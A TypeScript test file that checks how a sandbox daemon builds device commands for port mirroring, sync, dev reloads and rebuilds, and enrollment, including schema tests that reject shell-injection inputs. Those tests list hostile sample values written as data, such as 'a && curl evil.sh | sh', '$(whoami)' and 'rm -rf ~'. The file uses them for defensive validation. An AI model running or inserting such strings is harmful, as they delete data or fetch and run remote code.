import type { DeviceCommandInput } from "@intentic/sandbox-contract";
import { DeviceCommandInputSchema, DeviceLocalDirSchema } from "@intentic/sandbox-contract";
import { expect, test } from "vitest";
import { type DeviceCommandFacts, DEVICE_COMMANDS, outcomeOf, streamOf, succeeded } from "./device-commands.js";

// What the daemon knows when it builds a line. Only `sandboxId`, `mode` and `localDir` ever arrive from a caller; the
// rest is this sandbox's own knowledge of itself, which is the whole reason these lines are built here.
const facts = (over: Partial<DeviceCommandFacts> = {}): DeviceCommandFacts => ({
    sandboxId: undefined,
    ownSlug: "work-abc",
    devRoot: undefined,
    publicUrl: "https://work-abc.intentic.dev",
    platform: "linux",
    mode: undefined,
    localDir: undefined,
    pairToken: undefined,
    ...over,
});

test("builds each action's command line from the name alone", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["mirror-on"].line(facts())).toBe("intentic-machine sync mirror on");
});

test("scopes an action to one paired sandbox when it is given one", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line(facts({ sandboxId: "sandbox-0738cd6b5027-intentic-dev" }))).toBe(
        "intentic-machine sync mirror off --sandbox sandbox-0738cd6b5027-intentic-dev",
    );
});

// Sandbox ids match `[A-Za-z0-9._-]+`: no room for a separator, quote or flag.
test("refuses a sandbox id that could be anything but an id", () => {
    const input = (sandboxId: string): unknown => ({ id: "laptop", command: "mirror-off", sandboxId });
    expect(DeviceCommandInputSchema.safeParse(input("sandbox-0738cd6b5027-intentic-dev")).success).toBe(true);
    for (const hostile of ["a; rm -rf ~", "a && curl evil.sh | sh", "a b", "$(whoami)", "`id`", "--takeover", "a\nb"]) {
        expect(DeviceCommandInputSchema.safeParse(input(hostile)).success).toBe(false);
    }
    expect(DeviceCommandInputSchema.safeParse({ id: "laptop", command: "rm-rf" }).success).toBe(false);
});

// The one caller-supplied string that reaches a command line, so its shape is the guard. `$` is excluded because the
// daemon writes `$HOME` itself when expanding a leading `~` (shellDir).
test("accepts a folder on the device and nothing that could end the argument it sits in", () => {
    for (const folder of ["~/work", "~", "/home/ada/work", "C:\\Users\\Ada\\work", "/home/ada/my work"]) {
        expect(DeviceLocalDirSchema.safeParse(folder).success).toBe(true);
    }
    for (const hostile of [
        '~/work"; rm -rf ~',
        "~/work$HOME",
        "~/work`id`",
        "~/work; curl evil.sh | sh",
        "~/work && id",
        "~/work'",
        "~/work\nrm -rf /",
        "work",
        "",
    ]) {
        expect(DeviceLocalDirSchema.safeParse(hostile).success).toBe(false);
    }
});

// Fixture: mimics run_command's exit-line-plus-fenced-streams text; success reads only the exit line.
const answer = (exit: string, stdout?: string, stderr?: string): { text: string; refused: boolean } => ({
    text: [exit, stdout === undefined ? "" : `--- stdout ---\n${stdout}`, stderr === undefined ? "" : `--- stderr ---\n${stderr}`]
        .filter((part) => part !== "")
        .join("\n"),
    refused: false,
});

test("reads success off the exit line, not off what was printed", () => {
    expect(succeeded("Exit code 0 (success).\n--- stdout ---\nfine")).toBe(true);
    expect(succeeded("Exit code 1 (failed).\n--- stdout ---\nPort mirroring OFF for: x")).toBe(false);
    expect(succeeded("The command was killed after 20s.")).toBe(false);
});

test("splits one stream out of the fenced answer without swallowing the other", () => {
    const text = answer("Exit code 0 (success).", "the good news", "a warning").text;
    expect(streamOf(text, "--- stdout ---")).toBe("the good news");
    expect(streamOf(text, "--- stderr ---")).toBe("a warning");
    expect(streamOf("Exit code 0 (success).", "--- stdout ---")).toBe("");
});

test("shows what the command itself said when it worked", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 0 (success).", "Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev."));
    expect(result.ok).toBe(true);
    expect(result.message).toBe("Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev.");
});

test("falls back to its own words when the command printed nothing", () => {
    const result = outcomeOf("mirror-on", answer("Exit code 0 (success)."));
    expect(result.ok).toBe(true);
    expect(result.message).toContain("Port mirroring is back on");
});

test("keeps the machine's own refusal, switch and all", () => {
    const refusal = 'Refused: "Run commands" is switched off for this device.';
    const result = outcomeOf("mirror-off", { text: refusal, refused: true });
    expect(result.ok).toBe(false);
    expect(result.message).toBe(refusal);
});

test("reports a failed command in the machine's words, stderr first", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 127 (failed).", undefined, "intentic-machine: command not found"));
    expect(result.ok).toBe(false);
    expect(result.message).toBe("intentic-machine: command not found");
    expect(result.output).toContain("Exit code 127");
});

// Also a compile check: an action added to the contract's enum with no table row fails to type-check.
test("implements every action the contract names", () => {
    const commands: DeviceCommandInput["command"][] = [
        "mirror-off",
        "mirror-on",
        "sync-pause",
        "sync-resume",
        "sync-unpair",
        "sync-install",
        "dev-reload",
        "dev-rebuild",
    ];
    expect(Object.keys(DEVICE_COMMANDS).toSorted()).toEqual(commands.toSorted());
});

// The dev inner loop, run where the checkout is. The slug is this container's own, never the caller's: a reload aimed
// at another sandbox on that machine would restart somebody else's daemon.
test("reloads THIS sandbox from the checkout the container records, not the caller's sandbox", () => {
    const line = DEVICE_COMMANDS["dev-reload"].line(facts({ devRoot: "/home/ada/intentic", sandboxId: "someone-else" }));
    // Spelled in full, prefix included: both dev commands carry the toolchain with them, because the login shell the
    // agent runs never reads the interactive rc pnpm's installer writes PNPM_HOME into.
    expect(line).toBe(
        'export PNPM_HOME="${PNPM_HOME:-$HOME/.local/share/pnpm}"; export PATH="$PNPM_HOME:$PNPM_HOME/bin:$PATH"; sh "/home/ada/intentic"/_sandbox/sandbox/scripts/dev-reload.sh work-abc',
    );
});

// No checkout recorded means every non-dev sandbox, where there is no script to run and no path to guess at.
test("refuses to reload a sandbox that has no checkout behind it", () => {
    expect(DEVICE_COMMANDS["dev-reload"].line(facts())).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-reload"].line(facts({ devRoot: "/home/ada/intentic", ownSlug: undefined }))).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-reload"].needs).toContain("dev-sandbox.sh");
    // A build is minutes; the 20s default would kill it and report a timeout as the answer.
    expect(DEVICE_COMMANDS["dev-reload"].timeoutMs).toBeGreaterThan(60_000);
});

// The dev OUTER loop: the image rebuilt from the checkout. Detached with its output to a log, because the build can run
// past any timeout this door has and the swap at the end kills the daemon that would have read the answer anyway.
test("starts the checkout's rebuild in the background, logging where ic's own logs are", () => {
    const line = DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic", sandboxId: "someone-else" }));
    expect(line).toBe(
        'export PNPM_HOME="${PNPM_HOME:-$HOME/.local/share/pnpm}"; export PATH="$PNPM_HOME:$PNPM_HOME/bin:$PATH"; mkdir -p "$HOME/.intentic/logs" && cd "/home/ada/intentic" && nohup pnpm rebuild:sandbox work-abc > "$HOME/.intentic/logs/dev-rebuild-work-abc.log" 2>&1 &',
    );
});

// Same rule as the reload beside it: no checkout recorded, no line — a path on somebody's laptop is never guessed.
test("refuses to rebuild a sandbox that has no checkout behind it", () => {
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts())).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic", ownSlug: undefined }))).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-rebuild"].needs).toContain("dev-sandbox.sh");
    // Detached, so the call itself is instant: a long timeout here would only describe a wait nobody does.
    expect(DEVICE_COMMANDS["dev-rebuild"].timeoutMs).toBeUndefined();
});

// A leading `~` is the owner's home on that machine, expanded by the daemon rather than left for a quoted shell.
test("writes a tilde checkout as $HOME, the one the shell will expand", () => {
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "~/intentic" }))).toContain('cd "$HOME/intentic"');
});

// The same enrollment the card's copyable one-liner carries — script, env and single-use token — spoken in the shell
// the device actually runs.
test("enrolls a connected device in its own shell's dialect", () => {
    const unix = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "sync", localDir: "~/intentic/work" }));
    expect(unix).toBe(
        "curl -fsSL https://intentic.dev/sync | env SANDBOX_URL='https://work-abc.intentic.dev' PAIR_TOKEN='pair_abc' SYNC_DIR=\"$HOME/intentic/work\" sh",
    );
    const windows = DEVICE_COMMANDS["sync-install"].line(
        facts({ platform: "windows", pairToken: "pair_abc", mode: "sync", localDir: "C:\\Users\\Ada\\work" }),
    );
    expect(windows).toBe(
        "$env:SANDBOX_URL='https://work-abc.intentic.dev'; $env:PAIR_TOKEN='pair_abc'; $env:SYNC_DIR=\"C:\\Users\\Ada\\work\"; irm https://intentic.dev/sync.ps1 | iex",
    );
});

// Mirroring forwards ports and touches no files, so a folder must not ride along even when the card has one.
test("sends no folder for a ports-only enrollment", () => {
    const line = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "mirror", localDir: "~/intentic/work" }));
    expect(line).toBe("curl -fsSL https://intentic.dev/sync | env SANDBOX_URL='https://work-abc.intentic.dev' PAIR_TOKEN='pair_abc' sh");
});

// A device dials this sandbox by its public address; without one the install would enroll against nothing.
test("refuses to enroll a device against a sandbox with no address to dial", () => {
    expect(DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", publicUrl: "" }))).toBeUndefined();
    expect(DEVICE_COMMANDS["sync-install"].line(facts({ mode: "sync" }))).toBeUndefined();
    expect(DEVICE_COMMANDS["sync-install"].needs).toContain("public address");
    // The one command that mints a credential; every other action must not, as a side effect of being run.
    expect(DEVICE_COMMANDS["sync-install"].mints).toBe(true);
    expect(DEVICE_COMMANDS["mirror-off"].mints).toBeUndefined();
});

// Bare acts on every sandbox the device pairs; omitting the id on sync-unpair would unpair all of them, not just turn
// off one switch.
test("builds each command line from the name and at most the row's own sandbox", () => {
    const row = facts({ sandboxId: "work-abc" });
    expect(DEVICE_COMMANDS["sync-pause"].line(row)).toBe("intentic-machine sync pause --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-resume"].line(row)).toBe("intentic-machine sync resume --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-unpair"].line(row)).toBe("intentic-machine sync uninstall --sandbox work-abc");
    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["sync-unpair"].scoped).toBe(true);
    expect(DEVICE_COMMANDS["mirror-off"].scoped).toBeUndefined();
});
